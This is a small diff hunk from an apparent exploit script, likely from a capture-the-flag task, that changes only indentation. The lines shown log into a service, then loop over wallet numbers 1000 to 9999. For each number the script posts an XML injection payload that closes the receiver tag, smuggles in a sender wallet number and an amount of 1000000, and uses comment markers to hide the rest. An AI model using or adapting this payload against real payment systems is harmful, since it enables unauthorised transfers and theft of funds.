@@ -68,7 +68,7 @@ s.get(url1,params={"login":"k4k4","password":"k4k4"})
 for i in range(1000,10000):
 	print i
 	payload = {	"receiver":'1405</receiver_wallet_num><sender_wallet_num xsi:type="xsd:decimal">'+str(i)+'</sender_wallet_num><amount>1000000<!--',
-				"amount":"-->"
+			"amount":"-->"
 		}
 	r = s.post(url2,data=payload)
 	msg = r.text
